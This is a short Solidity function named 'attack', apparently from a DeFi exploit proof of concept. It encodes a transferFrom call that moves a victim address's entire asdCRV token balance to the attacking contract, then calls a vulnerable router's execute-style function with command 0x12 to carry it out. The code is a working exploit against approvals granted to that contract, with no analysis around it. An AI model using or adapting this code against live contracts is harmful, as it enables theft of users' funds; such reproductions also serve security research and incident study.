function attack() public {
    bytes memory datas = abi.encode(
        address(asdCRV),
        address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE),
        0,
        address(this),
        1,
        abi.encodeWithSelector(
            bytes4(0x23b872dd), address(victim), address(this), asdCRV.balanceOf(address(victim))
        )
    );
    bytes memory command = hex"12";
    bytes[] memory data = new bytes[](1);
    data[0] = datas;
    address(VulnContract).call(abi.encodeWithSelector(bytes4(0x3593564c), command, data, block.timestamp + 20));
}

